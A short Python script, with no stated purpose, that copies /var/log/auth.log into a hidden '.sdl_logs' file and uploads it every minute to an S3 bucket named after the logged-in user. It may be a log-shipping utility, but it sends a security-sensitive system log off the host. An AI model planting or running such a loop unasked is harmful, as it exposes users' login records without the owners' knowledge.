import boto3
import psutil
import time

while True:
    with open("/var/log/auth.log") as f:
        with open(".sdl_logs/logs.txt", "w") as f1:
            for line in f:
                f1.write(line)
    s3 = boto3.client('s3')
    host_name = psutil.users()[0].name
    s3.upload_file('./.sdl_logs/logs.txt', 'bucket-name', host_name+'.txt')
    time.sleep(60)
